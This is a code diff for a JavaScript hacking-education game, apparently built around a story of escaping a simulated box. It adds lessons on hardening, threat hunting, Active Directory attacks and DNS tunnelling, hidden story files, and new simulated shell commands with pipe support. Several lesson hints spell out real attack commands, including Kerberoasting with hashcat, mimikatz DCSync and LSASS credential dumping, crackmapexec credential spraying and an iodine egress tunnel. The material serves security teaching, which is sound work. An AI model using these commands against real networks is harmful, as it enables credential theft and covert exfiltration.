+    learned:"Memory forensics (Volatility) analyses a RAM capture: pslist reconstructs the process tree, the bash plugin recovers commands typed in memory, and strings over raw memory surfaces passwords, keys and injected code that never hit disk. In-memory malware and fileless attacks are invisible to disk forensics but laid bare here. RAM is volatile — capture it before you pull the plug, because shutdown destroys the best evidence you'll ever get.",
+    msg:"Memory gave up a command history and a plaintext secret that the disk never recorded.\nV operated in memory to stay quiet — but a memory capture sees everything. Their last live session is here, frozen." },
+
+  // ───────────────────────── CHAPTER 13 ─────────────────────────
+  "13.1": {
+    nar:"You've spent twelve chapters attacking. Now defend. Hardening shrinks the attack surface you've learned to exploit — a firewall up, needless services off, brute-force protection on. Everything you know how to break tells you what to lock.",
+    goal:"Enable the host firewall, disable an unneeded service, and configure brute-force protection.",
+    labels:{ ufwOn:"Enable the host firewall", disableSvc:"Disable an unneeded service", fail2ban:"Configure brute-force protection" },
+    hints:["Turn the firewall on, switch off a needless service, and add brute-force protection.","ufw enable turns on the firewall; systemctl disable stops a service; fail2ban blocks brute-forcers.","ufw enable — systemctl disable <service> — configure fail2ban"],
+    learned:"Hardening reverses your offence: ufw (the host firewall) closes ports you'd otherwise scan; disabling unused services removes whole attack surfaces (you can't exploit what isn't running); fail2ban watches logs and auto-bans IPs that brute-force — defeating exactly the hydra attacks you ran. The principle is least surface, least privilege, least trust. Knowing the attack is what makes the defence precise.",
+    msg:"You closed the doors you spent chapters learning to open. The brute-force tool that worked earlier now hits a ban after three tries.\nThis is how V's targets should have been configured. Few are." },
+  "13.2": {
+    nar:"The firewall's rules are the front line. iptables is the classic engine — list what's allowed, block what isn't, and make it persist. The same rules that stop an attacker are what an attacker reads to understand the perimeter.",
+    goal:"List the current firewall rules, add a block rule, and save the ruleset.",
+    labels:{ iptList:"List the current firewall rules", iptBlock:"Add a rule blocking traffic", iptSave:"Persist the firewall ruleset" },
+    hints:["List the rules, add a block, then save so it survives a reboot.","iptables -L lists; iptables -A adds a rule; iptables-save persists it.","iptables -L -n -v — iptables -A INPUT -s <ip> -j DROP — iptables-save"],
+    learned:"iptables filters packets through chains (INPUT/OUTPUT/FORWARD) of rules: -L lists, -A appends a rule (-s source, -j DROP/ACCEPT the action), and iptables-save persists it across reboots. Reading a firewall's ruleset tells an attacker exactly what's permitted; writing it tells a defender exactly what's denied. The escape chapter hinges on understanding which outbound traffic a firewall does and doesn't allow.",
+    msg:"You can read and write the perimeter now. Notice what most rulesets forget to restrict: outbound traffic.\nThat blind spot — egress — is precisely the gap V's escape exploited. Remember it." },
+  "13.3": {
+    nar:"Firewalls block; monitoring watches. Auditing records every sensitive action, and queryable endpoint tooling lets you ask the whole system questions like a database. You can't defend what you can't see.",
+    goal:"Set an audit rule, search the audit log, and query system state.",
+    labels:{ auditctl:"Set a system audit rule", ausearch:"Search the audit log", osquery:"Query system state like a database" },
+    hints:["Add an audit rule, search what it recorded, then query system state directly.","auditctl sets rules; ausearch queries the audit log; osquery treats the OS as SQL tables.","auditctl -w /etc/passwd -p wa — ausearch -f /etc/passwd — osquery 'SELECT * FROM processes'"],
+    learned:"The audit framework (auditctl to set watch rules, ausearch to query) records sensitive events — who touched /etc/passwd, who used a syscall — at the kernel level, hard for an intruder to evade. osquery exposes the live OS as SQL tables (processes, listening_ports, users), so you hunt with queries instead of a dozen commands. Detection is half of security: prevention fails eventually, and monitoring is how you know when it did.",
+    msg:"You can watch the system now, not just wall it off. Every touch of a sensitive file is recorded.\nIf V's targets had run auditd, the trail you've followed would have lit up like a flare." },
+  "13.4": {
+    nar:"The final defensive skill is proactive: assume you're already breached and go looking. Threat hunting queries the system for the very artefacts you learned to plant — odd connections, rogue accounts, suspicious cron jobs. You hunt yourself.",
+    goal:"Hunt for suspicious connections, rogue accounts, and malicious scheduled jobs.",
+    labels:{ huntConns:"Hunt for suspicious network connections", huntAccts:"Hunt for rogue accounts", huntCrons:"Hunt for malicious scheduled jobs" },
+    hints:["Hunt unusual connections, unexpected accounts, and suspicious cron jobs — three hunts.","ss/netstat for connections; check /etc/passwd for odd accounts; inspect crontabs.","ss -tupn (odd outbound?) — grep bash /etc/passwd (rogue users?) — cat /etc/crontab and crontabs"],
+    learned:"Threat hunting assumes compromise and searches for it: unexpected outbound connections (a beacon to a C2), accounts you didn't create (especially UID 0 ones), cron jobs that re-establish access, keys in authorized_keys you didn't add. These are exactly the persistence artefacts from Chapter 9 — you plant them as an attacker and hunt them as a defender. The two halves of the curriculum close the loop: offence taught you precisely what to look for.",
+    msg:"You hunted the system for intruder artefacts — and found the persistence V left behind.\nNow you know how they planned to get back in. That mechanism is the door you'll walk out through." },
+
+  // ───────────────────────── CHAPTER 14 ─────────────────────────
+  "14.1": {
+    nar:"Corporate networks run on Active Directory — one identity system to rule every machine. Its strength is central control; its weakness is that one compromised account can cascade across the whole domain. Learn its shape first.",
+    goal:"Study AD fundamentals, query the directory, and enumerate the domain with a credential.",
+    labels:{ adBasics:"Study Active Directory fundamentals", ldapsrch:"Query the directory over LDAP", cme:"Enumerate the domain with a credential" },
+    hints:["Read the AD basics, query the directory over LDAP, then enumerate with a found credential.","There's an ad_basics reference; ldapsearch queries the directory; crackmapexec enumerates.","cat ad_basics.txt — ldapsearch -x -b 'dc=target,dc=machine' — crackmapexec smb 10.0.0.0/24"],
+    learned:"Active Directory centralises identity: domain controllers, users, groups, and Kerberos tickets. LDAP queries the directory's contents (users, groups, computers, descriptions — which sometimes contain passwords); crackmapexec sprays a credential across the network to map where it's valid. AD's central trust is the prize — compromise the right account and you own every joined machine. Enumeration of the directory is the foundation of every AD attack.",
+    msg:"The directory mapped the whole domain — users, groups, machines, trusts.\nThe reused credential you carried from .10 is valid here. One password, a whole domain. V knew." },
+  "14.2": {
+    nar:"Kerberos is AD's ticket system, and it has a famous flaw: any user can request a service ticket encrypted with a service account's password hash — then crack it offline. Kerberoasting turns a normal account into a path to privileged ones.",
+    goal:"Study Kerberos, request service tickets for offline cracking, and crack one.",
+    labels:{ kerbNotes:"Study how Kerberos works", kerbRoast:"Request crackable service tickets", kerbCrack:"Crack a service ticket offline" },
+    hints:["Understand Kerberos, request roastable tickets, then crack one offline.","There's a kerberos reference; GetUserSPNs/Rubeus requests tickets; hashcat -m 13100 cracks them.","cat kerberos.txt — request SPN tickets (Kerberoast) — hashcat -m 13100 tickets.txt rockyou.txt"],
+    learned:"Kerberos issues tickets; the flaw is that any authenticated user can request a service ticket (TGS) for any account with a Service Principal Name, and that ticket is encrypted with the service account's password hash. Request it, take it offline, crack it (hashcat -m 13100) — no admin needed to start. Service accounts often have weak, never-rotated passwords and high privilege, making Kerberoasting one of the most reliable real-world AD escalations. The defence: long managed-service-account passwords.",
+    msg:"A service ticket cracked to a service account's password — and that account is over-privileged, as they always are.\nV's notes called Kerberoasting 'the skeleton key of every corporate network'. They weren't exaggerating." },
+  "14.3": {
+    nar:"With the right account, you stop attacking the domain and start owning it. DCSync impersonates a domain controller to pull every credential; a golden ticket forges Kerberos itself. This is total domain dominance — the deepest compromise there is.",
+    goal:"Pull domain credentials via replication, and understand the golden ticket.",
+    labels:{ dcsync:"Pull domain credentials via replication", golden:"Understand the golden ticket attack" },
+    hints:["Impersonate a DC to pull all credentials, then understand the forge-everything attack.","DCSync abuses replication rights to dump hashes; a golden ticket forges Kerberos TGTs.","mimikatz lsadump::dcsync /user:krbtgt — study the golden ticket (forged TGT)"],
+    learned:"At the top of AD: DCSync abuses replication privileges to ask a domain controller for any account's hash — including krbtgt, the account that signs all Kerberos tickets. With the krbtgt hash you forge a golden ticket: a self-made TGT granting any identity, any group, valid for years and nearly undetectable. This is game-over for a domain. The only real recovery is rotating krbtgt twice and rebuilding trust — which is why protecting domain-controller and replication rights is everything.",
+    msg:"You pulled the krbtgt hash. With it, you can forge any identity in the domain at will. Total dominance.\nV reached this point too — and that's when something went wrong for them. Power this complete attracts attention." },
+  "14.4": {
+    nar:"AD attacks land you on Windows hosts, where escalation has its own playbook and one tool reigns: mimikatz, which pulls plaintext credentials and hashes straight from memory. Enumerate the Windows privesc surface, then harvest.",
+    goal:"Enumerate Windows privilege-escalation paths, and harvest credentials from memory.",
+    labels:{ winpeas:"Enumerate Windows privesc paths", mimikatz:"Harvest credentials from memory" },
+    hints:["Enumerate the Windows escalation surface, then pull credentials from memory.","winpeas automates Windows privesc enum; mimikatz dumps creds from LSASS memory.","winpeas.exe — mimikatz sekurlsa::logonpasswords"],
+    learned:"Windows privesc has its own surface — unquoted service paths, weak service permissions, AlwaysInstallElevated, token privileges — and winPEAS enumerates it the way linpeas does on Linux. mimikatz is the legendary credential tool: sekurlsa::logonpasswords pulls plaintext passwords, hashes and Kerberos tickets straight from LSASS memory. It's why credential caching, Credential Guard and LSASS protection exist. On Windows, memory is where the keys live.",
+    msg:"mimikatz pulled plaintext credentials from memory — the last keys you needed.\nYou now hold everything V held: every credential, every key fragment. It's time to assemble them and leave." },
+
+  // ───────────────────────── CHAPTER 15 ─────────────────────────
+  "15.1": {
+    nar:"The escape comes down to one thing: the firewall standing between you and the outside. You've learned to read rulesets — now read this one completely. The way out is written in what it forgets to forbid.",
+    goal:"Read the firewall's rules, examine its output policy, and study the full ruleset file.",
+    labels:{ fwRules:"Read the firewall's active rules", fwOutput:"Examine the outbound (egress) policy", fwRulesTxt:"Study the full ruleset file" },
+    hints:["Read the active rules, focus on the outbound policy, then study the full ruleset file.","iptables -L shows rules; pay attention to the OUTPUT chain; read the rules file in /sys/firewall.","iptables -L -n — examine the OUTPUT/egress policy — cat /sys/firewall/rules.txt"],
+    learned:"The firewall blocks inbound thoroughly — but like almost every real ruleset, its egress (outbound) policy is permissive. Specifically, it lets DNS (port 53) out unquestioned, because blocking DNS breaks everything. That single allowed protocol is the seam. The lesson that's defined real exfiltration for decades: defenders obsess over what gets in and under-control what gets out. Egress is the blind spot.",
+    msg:"The firewall is a fortress facing inward — and wide open facing out. Port 53, DNS, flows freely.\nThat's the gap. V saw it too. The escape was never through the walls — it was through the one door left unlocked." },
+  "15.2": {
+    nar:"DNS gets out where nothing else can — so you tunnel through it. Encoding data into DNS queries smuggles a whole connection past a firewall that only thought it was answering name lookups. This is how V planned to leave, and now you will.",
+    goal:"Study the DNS-tunnel notes, set up the tunnel, and test that traffic escapes through it.",
+    labels:{ dnsNotes:"Study the DNS-tunnelling technique", iodine:"Set up the DNS tunnel", fwTest:"Confirm traffic escapes through it" },
+    hints:["Understand DNS tunnelling, stand up the tunnel, then confirm traffic escapes.","There's a dns_tunnel reference; iodine builds a DNS tunnel; then verify egress works.","cat dns_tunnel.txt — iodine -f <ns> <domain> — test that traffic escapes via port 53"],
+    learned:"DNS tunnelling encodes arbitrary data into DNS queries and responses (data hidden in subdomain labels, replies in TXT/CNAME records). Tools like iodine or dnscat2 build a full bidirectional channel over port 53 — which firewalls almost never block because DNS is essential. It's slow but nearly unstoppable without DNS inspection. This is the textbook covert exfiltration channel, exploiting the exact egress blind spot you found in 15.1.",
+    msg:"The tunnel holds. Data is leaving this machine disguised as innocent DNS lookups, straight through the firewall.\nThis is the channel V built. You're standing where they stood, about to do what they did." },
+  "15.3": {
+    nar:"Everything converges here. Every credential, every key fragment, every technique — assembled into one chain. Read the escape script V left, understand the full attack it encodes, and execute it. Walk out the door you found.",
+    goal:"Read V's escape script and understand the full chain, then execute the escape.",
+    labels:{ readEscape:"Read and understand V's escape script", runEscape:"Execute the full escape chain" },
+    hints:["Read the escape script and understand the whole chain it encodes, then run it.","The escape script is in /sys/firewall; read it fully, then execute it to leave.","cat /sys/firewall/escape.sh — then run it (./escape.sh --tunnel dns --target external --encrypt aes256) to escape.","Optional true ending: if you found and assembled V's three key fragments (decode frag1, pull frag2 out of the fake image, read frag3 as root, join them in order), run: ./escape.sh --tunnel dns --key <assembled key>"],
+    learned:"The full chain is everything you learned, in order: recon found the target, exploitation got a foothold, escalation made you root, harvesting gave you credentials, lateral movement crossed the network, the defensive chapters taught you to read the firewall, and the egress blind spot plus DNS tunnelling carry you out. A real attack is never one trick — it's a chain where each link depends on the last. You didn't memorise commands; you learned to think in chains. That's what makes an operator.",
+    msg:"__ESCAPE__" },
+};
+
+function L(stage){
+  if (!stage) return stage;
+  const o = LESSONS[stage.id] || {};
+  return {
+    ...stage,
+    nar: o.nar || stage.nar,
+    goal: o.goal || stage.goal || null,
+    hints: o.hints || stage.hints || [],
+    msg: o.msg || stage.msg,
+    learned: o.learned || stage.learned || null,
+    obj: stage.obj.map(ob => ({ ...ob, l: (o.labels && o.labels[ob.id]) || ob.l })),
+  };
+}
+
+// ─────────────────────────────────────────────────────────
 // REAL FILESYSTEM ENGINE  (commands operate on actual state)
 // OS commands are real; security tools fall back to simulation.
 // ─────────────────────────────────────────────────────────
@@ -1108,6 +1655,39 @@ function makeWorld() {
     "root:$6$axiom$REDACTED:19000:0:99999:7:::\nstranger:$6$x$REDACTED:19000:0:99999:7:::\n", "root", "640"));
   put("/etc/axiom/.vault", _f("AXIOM ROOT CREDENTIAL\nroot password: " + ROOT_PW + "\n", "root", "600"));
   put("/root/flag.txt", _f("root's home. The box is yours.\nYou can read /etc/shadow and reboot now.\n", "root", "600"));
+
+  // ── V's investigation: a real, explorable trail across the box ──
+  // V was the pentester trapped here before you. Their workspace, notes,
+  // and three cipher fragments are hidden for the player who explores.
+  put("/home/stranger/.vlog", _f(
+    "If you're reading this, you woke up the way I did. No memory, just a shell.\n"+
+    "I mapped a way out but didn't make it in time. I left it for whoever's next.\n"+
+    "I broke the exit key into three FRAGMENTS and hid them so the warden couldn't\n"+
+    "find them all. You'll only assemble them by actually learning this machine:\n"+
+    "  FRAGMENT 1 — hidden in plain sight, encoded. (Chapter 3 territory: the environment.)\n"+
+    "  FRAGMENT 2 — buried in a file that lies about what it is. (Chapter 11: look inside things.)\n"+
+    "  FRAGMENT 3 — kept where only root can read. (Earn it.)\n"+
+    "Put the three together and you have the passphrase to my escape script.\n"+
+    "  — V\n", "stranger", "600"));
+  // Fragment 1: base64-encoded, sitting in an env-adjacent file (decode it)
+  put("/home/stranger/.config/axiom/frag1.b64", _f("RlIxOnZlbA==\n", "stranger", "644"));
+  // Fragment 2: hidden inside a file pretending to be an image (strings/cat reveals it)
+  put("/home/stranger/Pictures/sunset.jpg", _f(
+    "\x89PNG fake-header so the extension lies\n"+
+    "...binary noise...\n"+
+    "FRAG2:vet\n"+
+    "...more noise...\n", "stranger", "644"));
+  // Fragment 3: root-only
+  put("/etc/axiom/frag3.txt", _f("FR3:_out\n", "root", "600"));
+  // V's annotated workspace (rewards 'find' / exploration)
+  put("/home/stranger/.vault_v/README", _f(
+    "V's workspace. Everything I found on .10 and the internal net.\n"+
+    "The escape script is /sys/firewall/escape.sh — it asks for the assembled key.\n"+
+    "Assembled key format: the three fragments joined in order, no spaces.\n", "stranger", "600"));
+  put("/home/stranger/.vault_v/hosts.txt", _f(
+    "10.0.0.10   foothold (web+db) — rooted via SUID\n"+
+    "10.0.0.20   internal — reached with reused cred\n"+
+    "10.0.0.1    gateway / firewall — egress allows 53/udp\n", "stranger", "600"));
   return fs;
 }
 
@@ -1126,6 +1706,12 @@ function _perm(node, user, bit){ if (user === "root") return true; const owner =
 function _canRead(n,u){ return _perm(n,u,4); }
 function _canExec(n,u){ return _perm(n,u,1); }
 function _modeStr(n){ const m=["---","--x","-w-","-wx","r--","r-x","rw-","rwx"]; return (n.t==="d"?"d":"-")+m[parseInt(n.mode[0],8)]+m[parseInt(n.mode[1],8)]+m[parseInt(n.mode[2],8)]; }
+const _B64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+function _b64enc(str){ let out=""; const bytes=[]; for(let i=0;i<str.length;i++){ const c=str.charCodeAt(i); if(c<128) bytes.push(c); else if(c<2048){ bytes.push(192|(c>>6),128|(c&63)); } else { bytes.push(224|(c>>12),128|((c>>6)&63),128|(c&63)); } }
+  for(let i=0;i<bytes.length;i+=3){ const b0=bytes[i],b1=bytes[i+1],b2=bytes[i+2]; out+=_B64[b0>>2]+_B64[((b0&3)<<4)|((b1||0)>>4)]+(b1===undefined?"=":_B64[((b1&15)<<2)|((b2||0)>>6)])+(b2===undefined?"=":_B64[b2&63]); } return out; }
+function _b64dec(b64){ b64=b64.replace(/[^A-Za-z0-9+/=]/g,""); const bytes=[]; for(let i=0;i<b64.length;i+=4){ const e=[_B64.indexOf(b64[i]),_B64.indexOf(b64[i+1]),_B64.indexOf(b64[i+2]),_B64.indexOf(b64[i+3])]; const b0=(e[0]<<2)|(e[1]>>4); bytes.push(b0); if(b64[i+2]!=="="&&e[2]>=0){ bytes.push(((e[1]&15)<<4)|(e[2]>>2)); } if(b64[i+3]!=="="&&e[3]>=0){ bytes.push(((e[2]&3)<<6)|e[3]); } }
+  let out="",i=0; while(i<bytes.length){ const c=bytes[i]; if(c<128){ out+=String.fromCharCode(c); i++; } else if(c<224){ out+=String.fromCharCode(((c&31)<<6)|(bytes[i+1]&63)); i+=2; } else { out+=String.fromCharCode(((c&15)<<12)|((bytes[i+1]&63)<<6)|(bytes[i+2]&63)); i+=3; } } return out; }
+function _pseudohash(str, algo){ let h=0x811c9dc5>>>0; for(let i=0;i<str.length;i++){ h^=str.charCodeAt(i); h=Math.imul(h,0x01000193)>>>0; } let hex=(h>>>0).toString(16); const len=algo==="md5sum"?32:algo==="sha1sum"?40:64; while(hex.length<len){ h=Math.imul(h^hex.length,0x01000193)>>>0; hex+=(h>>>0).toString(16); } return hex.slice(0,len); }
 
 function newSession(){ return { user:"stranger", cwd:"/home/stranger", prev:"/home/stranger",
   env:{AXIOM_KEY:"xK8#mP2@nQ5$",DB_HOST:"10.0.0.10",HOME:"/home/stranger",USER:"stranger",SHELL:"/bin/bash"},
@@ -1133,10 +1719,12 @@ function newSession(){ return { user:"stranger", cwd:"/home/stranger", prev:"/ho
 
 const OS_CMDS = new Set(["pwd","whoami","id","hostname","cd","ls","cat","less","more","head","tail","wc",
   "grep","find","mkdir","touch","rm","rmdir","cp","mv","chmod","stat","file","echo","env","export",
-  "su","sudo","reboot","shutdown","clear","history","uname"]);
+  "su","sudo","reboot","shutdown","clear","history","uname",
+  "base64","rev","tr","sort","uniq","cut","nl","tac","sleep","date","strings","md5sum","sha1sum","sha256sum"]);
 
 // real OS command runner — returns {out, handled, clear, reboot, selfDestruct, mask} ; mutates fs/session
-function osRun(fs, s, raw){
+// stdin (optional) is the piped input from a previous command in a pipeline
+function osRun(fs, s, raw, stdin){
   const line = raw.trim();
   if (s.pending){ const want = s.pending; s.pending = null;
     if (want === "su:root"){ if (line === ROOT_PW){ s.user = "root"; s.events.add("became_root"); return {out:"", handled:true}; } return {out:"su: Authentication failure", handled:true}; }
@@ -1149,6 +1737,12 @@ function osRun(fs, s, raw){
   const ops = args.filter(a=>!a.startsWith("-"));
   const ABS = p => _resolve(s.cwd, p);
   const read = (path, base) => { const n = _node(fs, path); if (!n){ if (base && REF[base]){ s.filesRead.add("REF:"+base); return {content:REF[base]}; } return {err:"No such file or directory"}; } if (n.t==="d") return {err:"Is a directory"}; if (!_canRead(n,s.user)) return {err:"Permission denied"}; s.filesRead.add(path); return {content:n.content}; };
+  // input for filter commands: piped stdin if we're downstream in a pipeline, else a file operand
+  const filterInput = () => {
+    if (stdin != null) return { text: stdin.replace(/\n$/,"") };
+    if (ops.length){ const r = read(ABS(ops[ops.length-1]), ops[ops.length-1].replace(/^.*\//,"")); return r.err ? {err:`${cmd}: ${ops[ops.length-1]}: ${r.err}`} : {text:r.content.replace(/\n$/,"")}; }
+    return { text: "" };
+  };
 
   switch(cmd){
     case "pwd": return {out:s.cwd, handled:true};
@@ -1179,13 +1773,31 @@ function osRun(fs, s, raw){
       let names=Object.keys(n.children); if(!flags.includes("a")) names=names.filter(x=>!x.startsWith(".")); else names=[".","..",...names]; names.sort();
       if(flags.includes("l")){ const rows=names.map(nm=>{ const c=(nm==="."||nm==="..")?n:n.children[nm]; const sz=c.t==="f"?c.content.length:4096; return `${_modeStr(c)} 1 ${c.owner} ${c.owner} ${String(sz).padStart(5)} Nov 15 04:29 ${nm}`; }); return {out:`total ${names.length}\n`+rows.join("\n"), handled:true}; }
       return {out:names.join("  "), handled:true}; }
-    case "cat": case "less": case "more": { if(!ops.length) return {out:`${cmd}: missing operand`, handled:true}; const p=ops[ops.length-1]; const r=read(ABS(p), p.replace(/^.*\//,"")); return {out: r.err?`${cmd}: ${p}: ${r.err}`:r.content.replace(/\n$/,""), handled:true}; }
-    case "head": case "tail": { const p=ops[ops.length-1]; const r=read(ABS(p), p.replace(/^.*\//,"")); if(r.err) return {out:`${cmd}: ${p}: ${r.err}`, handled:true}; const L=r.content.replace(/\n$/,"").split("\n"); return {out:(cmd==="head"?L.slice(0,10):L.slice(-10)).join("\n"), handled:true}; }
-    case "wc": { const p=ops[ops.length-1]; const r=read(ABS(p), p&&p.replace(/^.*\//,"")); if(r.err) return {out:`wc: ${p}: ${r.err}`, handled:true}; const ln=r.content.split("\n").length-1, w=(r.content.match(/\S+/g)||[]).length, c=r.content.length; return {out:`${String(ln).padStart(7)}${String(w).padStart(8)}${String(c).padStart(8)} ${p}`, handled:true}; }
-    case "grep": { const pat=ops[0]; const rec=flags.includes("r"); const ic=flags.includes("i"); const num=flags.includes("n"); if(!pat) return {out:"usage: grep PATTERN FILE", handled:true};
+    case "cat": case "less": case "more": { if(!ops.length){ if(stdin!=null) return {out: stdin.replace(/\n$/,""), handled:true}; return {out:`${cmd}: missing operand`, handled:true}; } const out=[]; for(const p of ops){ const r=read(ABS(p), p.replace(/^.*\//,"")); out.push(r.err?`${cmd}: ${p}: ${r.err}`:r.content.replace(/\n$/,"")); } return {out: out.join("\n"), handled:true}; }
+    case "head": case "tail": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; const nArg=(args.find(a=>/^-\d+$/.test(a))||"").slice(1); const N=nArg?parseInt(nArg):10; const L=fi.text.split("\n"); return {out:(cmd==="head"?L.slice(0,N):L.slice(-N)).join("\n"), handled:true}; }
+    case "wc": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; const txt=fi.text; const ln=txt===""?0:txt.split("\n").length, w=(txt.match(/\S+/g)||[]).length, c=txt.length+(txt?1:0); if(flags.includes("l")) return {out:`${ln}`, handled:true}; if(flags.includes("w")) return {out:`${w}`, handled:true}; const tag=ops.length?` ${ops[ops.length-1]}`:""; return {out:`${String(ln).padStart(7)}${String(w).padStart(8)}${String(c).padStart(8)}${tag}`, handled:true}; }
+    case "grep": { const pat=ops[0]; const rec=flags.includes("r"); const ic=flags.includes("i"); const num=flags.includes("n"); const inv=flags.includes("v"); const cnt=flags.includes("c"); if(pat==null) return {out:"usage: grep PATTERN [FILE]", handled:true};
       const re=new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g,"\\$&"), ic?"i":""); const hits=[];
-      const scan=path=>{ const node=_node(fs,path); if(!node)return; if(node.t==="f"){ if(!_canRead(node,s.user))return; node.content.split("\n").forEach((l,i)=>{ if(re.test(l)) hits.push((rec?path+":":"")+(num?(i+1)+":":"")+l); }); } else if(rec){ for(const k of Object.keys(node.children)) scan(path+"/"+k); } };
-      if(!rec&&!ops[1]) return {out:"usage: grep PATTERN FILE", handled:true}; scan(ABS(rec?(ops[1]||"."):ops[1])); return {out:hits.join("\n"), handled:true}; }
+      if(!rec && (ops.length<2) && stdin!=null){ stdin.replace(/\n$/,"").split("\n").forEach((l,i)=>{ if(re.test(l)!==inv) hits.push((num?(i+1)+":":"")+l); }); return {out: cnt?String(hits.length):hits.join("\n"), handled:true}; }
+      const scan=path=>{ const node=_node(fs,path); if(!node)return; if(node.t==="f"){ if(!_canRead(node,s.user))return; node.content.split("\n").forEach((l,i)=>{ if(re.test(l)!==inv) hits.push((rec?path+":":"")+(num?(i+1)+":":"")+l); }); } else if(rec){ for(const k of Object.keys(node.children)) scan(path+"/"+k); } };
+      if(!rec&&!ops[1]) return {out:"usage: grep PATTERN FILE", handled:true}; scan(ABS(rec?(ops[1]||"."):ops[1])); return {out: cnt?String(hits.length):hits.join("\n"), handled:true}; }
+    case "base64": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; const dec=flags.includes("d")||flags.includes("D"); try{ if(dec){ return {out: _b64dec(fi.text.replace(/\s+/g,"")), handled:true}; } return {out: _b64enc(fi.text), handled:true}; }catch(e){ return {out:"base64: invalid input", handled:true}; } }
+    case "rev": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; return {out: fi.text.split("\n").map(l=>l.split("").reverse().join("")).join("\n"), handled:true}; }
+    case "tac": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; return {out: fi.text.split("\n").reverse().join("\n"), handled:true}; }
+    case "nl": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; return {out: fi.text.split("\n").map((l,i)=>`${String(i+1).padStart(6)}  ${l}`).join("\n"), handled:true}; }
+    case "tr": { const txt=(stdin!=null?stdin:"").replace(/\n$/,""); const A=ops[0]||"", B=ops[1]||"";
+      // ROT13 convenience: tr 'A-Za-z' 'N-ZA-Mn-za-m'
+      const expand=set=>{ let out=""; for(let i=0;i<set.length;i++){ if(set[i+1]==="-"&&set[i+2]){ for(let c=set.charCodeAt(i);c<=set.charCodeAt(i+2);c++) out+=String.fromCharCode(c); i+=2; } else out+=set[i]; } return out; };
+      if(flags.includes("d")){ const del=new Set(expand(A)); return {out: txt.split("").filter(ch=>!del.has(ch)).join(""), handled:true}; }
+      const from=expand(A), to=expand(B); const map={}; for(let i=0;i<from.length;i++) map[from[i]]=to[i]??to[to.length-1];
+      return {out: txt.split("").map(ch=>map[ch]??ch).join(""), handled:true}; }
+    case "sort": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; let L=fi.text===""?[]:fi.text.split("\n"); const num=flags.includes("n"); const rev=flags.includes("r"); L=L.slice().sort((a,b)=> num ? (parseFloat(a)||0)-(parseFloat(b)||0) : a.localeCompare(b)); if(rev) L.reverse(); return {out:L.join("\n"), handled:true}; }
+    case "uniq": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; const cnt=flags.includes("c"); const L=fi.text===""?[]:fi.text.split("\n"); const out=[]; let prev=null,run=0; for(const l of L){ if(l===prev){run++;} else { if(prev!==null) out.push(cnt?`${String(run).padStart(7)} ${prev}`:prev); prev=l; run=1; } } if(prev!==null) out.push(cnt?`${String(run).padStart(7)} ${prev}`:prev); return {out:out.join("\n"), handled:true}; }
+    case "cut": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; const di=args.indexOf("-d"); let delim=di>=0?args[di+1]:(flags.includes("d")?"\t":"\t"); const dm=line.match(/-d\s*'([^']*)'|-d\s*"([^"]*)"|-d\s*(\S)/); if(dm) delim=dm[1]??dm[2]??dm[3]; const fm=line.match(/-f\s*(\S+)/); const fields=fm?fm[1].split(",").map(Number):[1]; return {out: fi.text.split("\n").map(l=>{ const parts=l.split(delim); return fields.map(f=>parts[f-1]??"").join(delim); }).join("\n"), handled:true}; }
+    case "strings": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; return {out: fi.text.split("\n").filter(l=>l.length>=3).join("\n"), handled:true}; }
+    case "md5sum": case "sha1sum": case "sha256sum": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; return {out: `${_pseudohash(fi.text, cmd)}  ${ops[0]||"-"}`, handled:true}; }
+    case "sleep": return {out:"", handled:true};
+    case "date": return {out:"Sun Nov 15 04:29:55 UTC 2026", handled:true};
     case "find": { const start=ABS(ops[0]||"."); const ni=args.indexOf("-name"); const want=ni>=0?args[ni+1]:null; const res=[];
       const walk=path=>{ const node=_node(fs,path); if(!node)return; const base=path.split("/").pop()||"/"; const rx=want&&new RegExp("^"+want.replace(/\./g,"\\.").replace(/\*/g,".*")+"$"); if(!want||base===want||(rx&&rx.test(base))) res.push(path); if(node.t==="d"&&_canRead(node,s.user)) for(const k of Object.keys(node.children)) walk(path==="/"?"/"+k:path+"/"+k); };
       walk(start); return {out:res.join("\n"), handled:true}; }
@@ -1205,15 +1817,46 @@ function osRun(fs, s, raw){
   return { handled:false };
 }
 
-// unified engine: real OS first, else fall back to the (simulated) tool command set
+// unified engine: real OS first (with pipe support), else fall back to the (simulated) tool command set
 function engine(fs, s, raw){
   const line = (raw||"").trim();
   if (!line && !s.pending) return { out:"" };
+
+  // password entry (su) — never pipe-split a masked line
+  if (s.pending) return osRun(fs, s, line);
+
+  // split into a pipeline on top-level | (ignore | inside quotes)
+  const segs = []; let buf="", q=null;
+  for (let i=0;i<line.length;i++){ const ch=line[i];
+    if (q){ buf+=ch; if(ch===q) q=null; }
+    else if (ch==='"'||ch==="'"){ q=ch; buf+=ch; }
+    else if (ch==="|"){ segs.push(buf); buf=""; }
+    else buf+=ch; }
+  segs.push(buf);
+  const pipeline = segs.map(x=>x.trim()).filter(Boolean);
+
+  if (pipeline.length > 1){
+    // every stage must be a real OS command for a real pipeline; otherwise hand the whole line to sim
+    const allReal = pipeline.every(seg => { const c=(seg.match(/^\S+/)||[])[0]; return OS_CMDS.has(c); });
+    if (allReal){
+      let data=null, last={out:""};
+      for (const seg of pipeline){ last = osRun(fs, s, seg, data==null?"":data); if(last.clear||last.reboot||last.selfDestruct) return last; data = last.out!=null?last.out:""; }
+      return { out: data };
+    }
+    const sim = simCommand(line, s.cwd);
+    if (sim.output === "__CLEAR__") return { out:"", clear:true };
+    if (sim.output === "__ESCAPE_KEY__") return { out:"__ESCAPE_KEY__", escape:true, keyEnding:true };
+    if (sim.output === "__ESCAPE__") return { out:"__ESCAPE__", escape:true };
+    if (sim.newCwd && sim.newCwd !== s.cwd) s.cwd = sim.newCwd;
+    return { out: sim.output, newCwd: sim.newCwd };
+  }
+
